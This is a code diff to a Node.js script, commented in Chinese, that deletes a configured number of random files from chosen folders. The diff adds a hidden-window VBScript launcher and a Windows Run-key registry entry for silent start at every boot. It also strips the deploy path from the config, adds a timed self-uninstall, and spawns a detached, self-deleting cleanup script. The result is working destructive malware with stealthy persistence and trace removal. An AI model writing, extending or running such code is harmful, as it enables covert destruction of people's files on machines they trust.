@@ -1,17 +1,21 @@
 /**
  * 随机删除文件，配置见同目录 config.json
- * 日志写入同目录 run.log
+ * 安装: node init.js install（需已安装 Node.js；或从源目录运行自动检测安装）
+ * 日志: run.log / install.log
  */
 
 const fs = require('fs');
 const path = require('path');
+const { spawn, execSync } = require('child_process');
 
 const CONFIG_FILE = 'config.json';
 const LOG_FILE = 'run.log';
+const INSTALL_LOG_FILE = 'install.log';
 
 const DEFAULT_CONFIG = {
   startDate: null,
   endDate: null,
+  uninstallAt: null,
   deleteCount: 40,
   lastRunTime: null,
   deleteFolderPaths: [],
@@ -63,34 +67,220 @@ function ensureDir(dirPath) {
   return resolved;
 }
 
-function loadConfig() {
-  const deployPath = __dirname;
-  const configPath = path.join(deployPath, CONFIG_FILE);
-  let config;
-  let usedDefault = false;
-
-  if (fs.existsSync(configPath)) {
-    try {
-      const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
-      config = { ...DEFAULT_CONFIG, ...raw };
-    } catch {
-      config = { ...DEFAULT_CONFIG };
-      usedDefault = true;
-    }
-  } else {
-    config = { ...DEFAULT_CONFIG };
-    usedDefault = true;
+function readConfigFile(configPath) {
+  if (!fs.existsSync(configPath)) {
+    return { config: { ...DEFAULT_CONFIG }, usedDefault: true };
   }
+  try {
+    const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
+    return { config: { ...DEFAULT_CONFIG, ...raw }, usedDefault: false };
+  } catch {
+    return { config: { ...DEFAULT_CONFIG }, usedDefault: true };
+  }
+}
 
-  config.deployPath = deployPath;
+function normalizeRuntimeConfig(config, baseDir) {
+  config.deployPath = baseDir;
   config.deleteCount = Math.max(1, parseInt(config.deleteCount, 10) || DEFAULT_CONFIG.deleteCount);
   config.maxDepth = Math.max(1, parseInt(config.maxDepth, 10) || DEFAULT_CONFIG.maxDepth);
   config.deleteFolderPaths = Array.isArray(config.deleteFolderPaths)
     ? config.deleteFolderPaths.map(expandEnv).filter(Boolean)
     : [];
   config.enableLog = config.enableLog !== false;
+  return config;
+}
 
+function loadConfig() {
+  const configPath = path.join(__dirname, CONFIG_FILE);
+  const { config, usedDefault } = readConfigFile(configPath);
+  normalizeRuntimeConfig(config, __dirname);
   return { config, configPath, usedDefault };
+}
+
+function loadInstallConfig(sourceDir) {
+  const configPath = path.join(sourceDir, CONFIG_FILE);
+  const { config, usedDefault } = readConfigFile(configPath);
+  if (!config.deployPath) {
+    throw new Error('config.json 缺少 deployPath，无法安装');
+  }
+  const deployPath = path.resolve(expandEnv(config.deployPath));
+  const scope = String(config.registryScope || DEFAULT_CONFIG.registryScope).toUpperCase();
+  if (scope !== 'HKCU' && scope !== 'HKLM') {
+    throw new Error(`registryScope 必须为 HKCU 或 HKLM，当前: ${scope}`);
+  }
+  const regName = config.regName || DEFAULT_CONFIG.regName;
+  const removeKeys = Array.isArray(config.removeConfigKeysAfterDeploy)
+    ? config.removeConfigKeysAfterDeploy.map(String)
+    : ['deployPath'];
+  return {
+    config,
+    configPath,
+    usedDefault,
+    deployPath,
+    registryScope: scope,
+    regName,
+    removeKeys,
+    enableLog: config.enableLog !== false,
+  };
+}
+
+function writeDeployConfig(sourceConfigPath, destConfigPath, removeKeys) {
+  const raw = JSON.parse(fs.readFileSync(sourceConfigPath, 'utf8'));
+  const strip = new Set(
+    [...removeKeys, 'removeConfigKeysAfterDeploy'].map((k) => String(k).toLowerCase())
+  );
+  const out = {};
+  for (const [key, value] of Object.entries(raw)) {
+    if (!strip.has(key.toLowerCase())) out[key] = value;
+  }
+  fs.writeFileSync(destConfigPath, `${JSON.stringify(out, null, 2)}\n`, 'utf8');
+}
+
+function findNodeExe() {
+  try {
+    const out = execSync('where node', { encoding: 'utf8', windowsHide: true }).trim();
+    const first = out.split(/\r?\n/).find(Boolean);
+    if (first && fs.existsSync(first)) return first;
+  } catch {
+    /* try fallbacks */
+  }
+  const candidates = [
+    path.join(process.env.ProgramFiles || '', 'nodejs', 'node.exe'),
+    path.join(process.env['ProgramFiles(x86)'] || '', 'nodejs', 'node.exe'),
+  ];
+  for (const p of candidates) {
+    if (p && fs.existsSync(p)) return p;
+  }
+  return null;
+}
+
+function setRegistryRunValue(scope, regName, regValue) {
+  const regKey = getRegistryRunKey(scope);
+  if (!regKey) throw new Error(`无效的 registryScope: ${scope}`);
+  // 只转义引号，不要把 \ 变成 \\（否则注册表里会是 C:\\Windows，开机无法执行）
+  const data = regValue.replace(/"/g, '\\"');
+  execSync(`reg add "${regKey}" /v "${regName}" /t REG_SZ /d "${data}" /f`, {
+    stdio: 'ignore',
+    windowsHide: true,
+  });
+}
+
+function getDeployNodeExe(deployPath) {
+  return path.join(deployPath, 'node', 'node.exe');
+}
+
+/** 复制当前 node 到部署目录，避免开机时 nvm 路径不可用 */
+function ensureDeployNode(nodeExe, deployPath) {
+  const dest = getDeployNodeExe(deployPath);
+  ensureDir(path.dirname(dest));
+  fs.copyFileSync(nodeExe, dest);
+  return dest;
+}
+
+/** 生成 run.vbs，以隐藏窗口方式启动 node（注册表指向 wscript //B） */
+function writeRunVbs(vbsPath, nodeExe, initJsPath, workDir) {
+  const q = (s) => String(s).replace(/"/g, '""');
+  const body = [
+    'Option Explicit',
+    '',
+    'Dim fso, bootLog, bootLogFile, sh, nodeExe, initJs',
+    'Set fso = CreateObject("Scripting.FileSystemObject")',
+    `bootLog = fso.BuildPath("${q(workDir)}", "boot.log")`,
+    'On Error Resume Next',
+    'Set bootLogFile = fso.OpenTextFile(bootLog, 8, True)',
+    'bootLogFile.WriteLine Now & " run.vbs start"',
+    'bootLogFile.Close',
+    '',
+    `nodeExe = "${q(nodeExe)}"`,
+    `initJs = "${q(initJsPath)}"`,
+    'If Not fso.FileExists(nodeExe) Then',
+    '  Set bootLogFile = fso.OpenTextFile(bootLog, 8, True)',
+    '  bootLogFile.WriteLine Now & " ERROR node missing: " & nodeExe',
+    '  bootLogFile.Close',
+    '  WScript.Quit 1',
+    'End If',
+    'Set sh = CreateObject("Wscript.Shell")',
+    `sh.CurrentDirectory = "${q(workDir)}"`,
+    'sh.Run """" & nodeExe & """ """ & initJs & """", 0, False',
+    '',
+  ].join('\r\n');
+  fs.writeFileSync(vbsPath, body, 'utf8');
+}
+
+function installSilentLauncher(deployPath, scope, regName, nodeExe, initFileName) {
+  const vbsPath = path.join(deployPath, 'run.vbs');
+  const initJs = path.join(deployPath, initFileName);
+  writeRunVbs(vbsPath, nodeExe, initJs, deployPath);
+  const wscript = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'wscript.exe');
+  const regValue = `"${wscript}" //B //Nologo "${vbsPath}"`;
+  setRegistryRunValue(scope, regName, regValue);
+  return vbsPath;
+}
+
+function shouldRunUninstall() {
+  return process.argv.slice(2).includes('uninstall');
+}
+
+function shouldRunInstall() {
+  if (process.argv.slice(2).includes('install')) return true;
+  const configPath = path.join(__dirname, CONFIG_FILE);
+  if (!fs.existsSync(configPath)) return false;
+  try {
+    const raw = JSON.parse(fs.readFileSync(configPath, 'utf8'));
+    if (!raw.deployPath) return false;
+    const target = path.resolve(expandEnv(String(raw.deployPath)));
+    return path.resolve(__dirname) !== target;
+  } catch {
+    return false;
+  }
+}
+
+function performInstall() {
+  const sourceDir = __dirname;
+  const installCfg = loadInstallConfig(sourceDir);
+  loggingEnabled = installCfg.enableLog;
+  logPath = installCfg.enableLog
+    ? path.join(installCfg.deployPath, INSTALL_LOG_FILE)
+    : '';
+
+  if (installCfg.usedDefault) {
+    log(`配置文件不存在或无效: ${installCfg.configPath}`);
+  }
+
+  ensureDir(installCfg.deployPath);
+  log(`安装开始 Computer=${process.env.COMPUTERNAME} User=${process.env.USERNAME}`);
+  log(`部署目录: ${installCfg.deployPath} 注册表: ${installCfg.registryScope}`);
+
+  if (installCfg.registryScope === 'HKLM') {
+    log('WARN: registryScope=HKLM 通常需要管理员权限');
+  }
+
+  const systemNode = findNodeExe();
+  if (!systemNode) {
+    throw new Error('未找到 Node.js，请先安装 Node.js 后执行: node init.js install');
+  }
+  const nodeExe = ensureDeployNode(systemNode, installCfg.deployPath);
+  log(`使用 Node（已复制到部署目录）: ${nodeExe}`);
+
+  const selfPath = path.join(sourceDir, path.basename(__filename));
+  const deployInit = path.join(installCfg.deployPath, path.basename(__filename));
+  fs.copyFileSync(selfPath, deployInit);
+
+  const deployConfigPath = path.join(installCfg.deployPath, CONFIG_FILE);
+  writeDeployConfig(installCfg.configPath, deployConfigPath, installCfg.removeKeys);
+  log(`已写入部署配置（移除字段: ${installCfg.removeKeys.join(', ')}）`);
+
+  const runVbsPath = installSilentLauncher(
+    installCfg.deployPath,
+    installCfg.registryScope,
+    installCfg.regName,
+    nodeExe,
+    path.basename(__filename)
+  );
+  log(`静默启动: ${runVbsPath}（注册表经 wscript //B，无 CMD 窗口）`);
+  log(`已注册开机启动: ${getRegistryRunKey(installCfg.registryScope)}\\${installCfg.regName}`);
+  log('安装完成');
+  log('========== 安装结束 ==========\n');
 }
 
 function saveConfig(configPath, config) {
@@ -101,6 +291,122 @@ function parseDateOnly(str) {
   if (!str) return null;
   const d = new Date(`${str}T00:00:00`);
   return Number.isNaN(d.getTime()) ? null : d;
+}
+
+/** 解析卸载时间：支持 YYYY-M-D、YYYY-MM-DD、带时分秒（本地时间） */
+function parseDateTime(str) {
+  if (!str) return null;
+  const s = String(str).trim();
+  const m = s.match(
+    /^(\d{4})-(\d{1,2})-(\d{1,2})(?:[T\s](\d{1,2}):(\d{2})(?::(\d{2}))?)?$/
+  );
+  if (m) {
+    const isoDate = `${m[1]}-${String(m[2]).padStart(2, '0')}-${String(m[3]).padStart(2, '0')}`;
+    let iso;
+    if (m[4] !== undefined) {
+      iso = `${isoDate}T${String(m[4]).padStart(2, '0')}:${m[5]}:${m[6] ? String(m[6]).padStart(2, '0') : '00'}`;
+    } else {
+      iso = `${isoDate}T23:59:59`;
+    }
+    const d = new Date(iso);
+    return Number.isNaN(d.getTime()) ? null : d;
+  }
+  const normalized = s.includes('T') ? s : s.replace(' ', 'T');
+  const d = new Date(normalized);
+  return Number.isNaN(d.getTime()) ? null : d;
+}
+
+function getUninstallDeadline(config) {
+  const at = parseDateTime(config.uninstallAt);
+  if (at) return at;
+  if (config.uninstallAt) {
+    log(`WARN: uninstallAt 无法解析「${config.uninstallAt}」，将回退使用 endDate`);
+  }
+  if (config.endDate) return parseDateTime(config.endDate);
+  return null;
+}
+
+function isPastUninstallDeadline(deadline) {
+  return deadline != null && new Date() >= deadline;
+}
+
+function getRegistryRunKey(scope) {
+  const s = String(scope || 'HKCU').toUpperCase();
+  if (s !== 'HKCU' && s !== 'HKLM') return null;
+  return `${s}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`;
+}
+
+function isUnsafeDeletePath(dirPath) {
+  const normalized = path.resolve(dirPath).replace(/\//g, '\\');
+  return /^[A-Za-z]:\\?$/.test(normalized);
+}
+
+/** 删除开机启动注册表项 */
+function removeRegistryRun(scope, regName) {
+  const regKey = getRegistryRunKey(scope);
+  if (!regKey || !regName) {
+    log('注册表配置无效，跳过删除启动项');
+    return false;
+  }
+  try {
+    execSync(`reg delete "${regKey}" /v "${regName}" /f`, {
+      stdio: 'ignore',
+      windowsHide: true,
+    });
+    log(`已删除注册表启动项: ${regKey}\\${regName}`);
+    return true;
+  } catch {
+    log(`注册表启动项不存在或删除失败: ${regKey}\\${regName}`);
+    return false;
+  }
+}
+
+/** 进程退出后静默延迟删除部署目录（wscript 等待数秒再删，无 CMD 窗口、无循环重试） */
+function scheduleDeployFolderDelete(deployPath) {
+  if (isUnsafeDeletePath(deployPath)) {
+    log(`拒绝删除盘符根目录: ${deployPath}`);
+    return false;
+  }
+  const cleanupVbs = path.join(
+    process.env.TEMP || process.env.TMP || '.',
+    `init-cleanup-${Date.now()}.vbs`
+  );
+  const q = (s) => String(s).replace(/"/g, '""');
+  const vbsBody = [
+    'Option Explicit',
+    'WScript.Sleep 6000',
+    'On Error Resume Next',
+    'Dim fso',
+    'Set fso = CreateObject("Scripting.FileSystemObject")',
+    `If fso.FolderExists("${q(deployPath)}") Then fso.DeleteFolder "${q(deployPath)}", True`,
+    'fso.DeleteFile WScript.ScriptFullName, True',
+    '',
+  ].join('\r\n');
+  try {
+    fs.writeFileSync(cleanupVbs, vbsBody, 'utf8');
+    const wscript = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'wscript.exe');
+    const child = spawn(wscript, ['//B', '//Nologo', cleanupVbs], {
+      detached: true,
+      stdio: 'ignore',
+      windowsHide: true,
+    });
+    child.unref();
+    log(`已安排静默删除部署目录（约 6 秒后）: ${deployPath}`);
+    return true;
+  } catch (err) {
+    log(`安排删除部署目录失败: ${err.message}`);
+    return false;
+  }
+}
+
+/** 到期自动卸载：删注册表启动项 + 延迟删除部署目录 */
+function performUninstall(config) {
+  const deployPath = config.deployPath || __dirname;
+  const scope = config.registryScope || DEFAULT_CONFIG.registryScope;
+  const regName = config.regName || DEFAULT_CONFIG.regName;
+  log(`自动卸载开始: deploy=${deployPath} scope=${scope} reg=${regName}`);
+  removeRegistryRun(scope, regName);
+  return scheduleDeployFolderDelete(deployPath);
 }
 
 /** 转为本地年月日 0 点 */
@@ -188,8 +494,9 @@ function collectFiles(root, maxDepth, depth = 0, out = []) {
 
 function pickRandom(arr, n) {
   const copy = [...arr];
+  const count = Math.min(n, copy.length);
   const picked = [];
-  for (let i = 0; i < Math.min(n, copy.length); i++) {
+  for (let i = 0; i < count; i++) {
     const idx = Math.floor(Math.random() * copy.length);
     picked.push(copy[idx]);
     copy.splice(idx, 1);
@@ -207,6 +514,17 @@ function main() {
     log(`配置文件: ${configPath}`);
   }
   log(`删除数量: ${config.deleteCount}，扫描深度: ${config.maxDepth}`);
+
+  const uninstallDeadline = getUninstallDeadline(config);
+  if (uninstallDeadline) {
+    log(`计划卸载时间: ${uninstallDeadline.toLocaleString()}`);
+  }
+  if (isPastUninstallDeadline(uninstallDeadline)) {
+    log('已到指定卸载时间，执行自动卸载');
+    performUninstall(config);
+    log('========== 任务结束 ==========\n');
+    return;
+  }
 
   if (!isWithinDateRange(config.startDate, config.endDate)) {
     log(
@@ -290,10 +608,36 @@ function main() {
   log('========== 任务结束 ==========\n');
 }
 
+function runUninstall() {
+  const installCfg = loadInstallConfig(__dirname);
+  loggingEnabled = installCfg.enableLog;
+  logPath = installCfg.enableLog
+    ? path.join(installCfg.deployPath, INSTALL_LOG_FILE)
+    : '';
+  log('手动卸载开始');
+  performUninstall({
+    deployPath: installCfg.deployPath,
+    registryScope: installCfg.registryScope,
+    regName: installCfg.regName,
+  });
+  log('========== 卸载结束 ==========\n');
+}
+
 try {
-  main();
+  if (shouldRunInstall()) {
+    performInstall();
+  } else if (shouldRunUninstall()) {
+    runUninstall();
+  } else {
+    main();
+  }
 } catch (err) {
-  if (!logPath) logPath = path.join(__dirname, LOG_FILE);
+  if (!logPath) {
+    logPath = path.join(
+      __dirname,
+      shouldRunInstall() || shouldRunUninstall() ? INSTALL_LOG_FILE : LOG_FILE
+    );
+  }
   try {
     const cfg = JSON.parse(
       fs.readFileSync(path.join(__dirname, CONFIG_FILE), 'utf8')
@@ -302,7 +646,8 @@ try {
   } catch {
     /* 使用默认 loggingEnabled */
   }
-  log(`异常退出: ${err.message || err}`);
-  log('========== 任务结束 ==========\n');
+  const label = shouldRunInstall() ? '安装' : shouldRunUninstall() ? '卸载' : '任务';
+  log(`${label}异常退出: ${err.message || err}`);
+  log(`========== ${label}结束 ==========\n`);
   process.exit(1);
 }
